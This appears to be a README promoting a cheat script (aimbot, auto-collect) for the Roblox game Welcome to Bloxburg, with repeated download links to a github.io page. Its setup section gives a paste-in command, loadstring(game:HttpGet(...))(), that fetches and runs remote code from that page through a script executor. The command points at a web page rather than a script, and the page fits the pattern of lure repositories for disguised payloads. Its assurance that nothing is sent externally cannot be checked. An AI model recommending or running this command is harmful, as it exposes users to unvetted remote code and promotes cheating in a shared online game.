# Welcome to Bloxburg Script v1.0 - Game Script Utility 2026

> **A game script made for Welcome to Bloxburg on PC.** It offers automation and support features, including aimbot and auto-collect functions.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-PC-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/mattjames2003/welcome-bloxburg-hub-v1?style=flat-square)](https://github.com/mattjames2003/welcome-bloxburg-hub-v1)

---

<p align="center">
  <a href="https://mattjames2003.github.io/welcome-bloxburg-hub-v1/">
    <img src="https://img.shields.io/badge/Download-Welcome%20to%20Bloxburg%20Script-brightgreen?style=for-the-badge" alt="Download Welcome to Bloxburg Script">
  </a>
</p>

> **[Direct Download - Welcome to Bloxburg Script](https://mattjames2003.github.io/welcome-bloxburg-hub-v1/)**

---

[Download Latest Build](https://mattjames2003.github.io/welcome-bloxburg-hub-v1/)

---

## What It Does

Welcome to Bloxburg Script is built to add automated help inside Welcome to Bloxburg, reducing the need for repeated manual actions and improving aiming behavior where applicable. The goal is to make routine in-game tasks easier so players can spend more time building, role-playing, and exploring instead of constantly collecting items or lining up precise shots. It works directly with the game environment to deliver quick-response automation.

The present release centers on dependable operation for both the aimbot and auto-collect parts, with attention on keeping them stable from session to session. Ongoing updates are intended to improve these core modules while staying aligned with recent game patches. This tool is meant for PC users and needs a compatible executor to run.

---

## Feature List

- **Aimbot Module** - Automatically steers your aim toward nearby targets for better accuracy in supported situations.
- **Auto-Collect Function** - Picks up items and nearby resources without manual input, which helps during farming or collection tasks.
- **Toggle Controls** - Turn each feature on or off independently using configurable hotkeys.
- **Smooth Aiming** - Uses smoothing behavior to reduce sharp or unnatural aim changes.
- **Customizable Collection Radius** - Set how far away auto-collect should activate to match your preferred play style.
- **Lightweight Execution** - Designed to keep impact on the game client low while running.
- **Hotkey Customization** - Choose the keys you want for enabling or disabling script features.
- **Session Persistence** - Settings stay active for the current game session until you change them.

---

## Setup

1. Download the latest script file from the [download link](https://mattjames2003.github.io/welcome-bloxburg-hub-v1/).
2. Open your preferred script executor that supports Welcome to Bloxburg.
3. Load the script into the executor.
4. Inject or execute the script while inside the game.
5. Use the default hotkeys or configure them as described in the Options section below.

Example execution command (if supported by your executor):

```lua
loadstring(game:HttpGet("https://mattjames2003.github.io/welcome-bloxburg-hub-v1/"))()
```

---

## Options

Below are the configurable options and their default values. Change them in the script file or through the in-game UI if one is available.

| Option | Default Value | Description |
|--------|---------------|-------------|
| Aimbot Enabled | true | Toggles the aimbot feature on or off |
| Auto-Collect Enabled | true | Toggles automatic item collection |
| Collection Radius | 20 | Distance in studs for auto-collect range |
| Aimbot Smoothness | 0.5 | Smoothing factor (0 = instant, 1 = very smooth) |
| Toggle Key (Aimbot) | RightShift | Key to toggle aimbot on/off |
| Toggle Key (Auto-Collect) | RightControl | Key to toggle auto-collect on/off |

---

## Compatibility

- **Supported Game**: Welcome to Bloxburg (Roblox)
- **Platform**: PC only (Windows/macOS with compatible executor)
- **Game Version**: Tested on the latest public release as of early 2026
- **Known Limitations**: May not function correctly if the game receives major updates that alter core mechanics. Aimbot performance depends on server latency and target movement.

---

## FAQ

**How do I install this script?**  
Download the script file and load it with a compatible Roblox executor. See the Setup section above for step-by-step instructions.

**Will this script work after a game update?**  
Compatibility is maintained as the script is updated alongside the latest Welcome to Bloxburg release. If something breaks after an update, check for a newer version or report the issue.

**Can I change the hotkeys?**  
Yes. Open the script file in a text editor and edit the key bindings listed in the Options section. Use your executor's documentation to confirm valid key names.

**Does this script work on other Roblox games?**  
No. It is intended specifically for Welcome to Bloxburg and may not behave correctly in other games.

**Where is the script data stored?**  
All settings remain in memory during the session. Nothing is written to your hard drive or sent externally.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
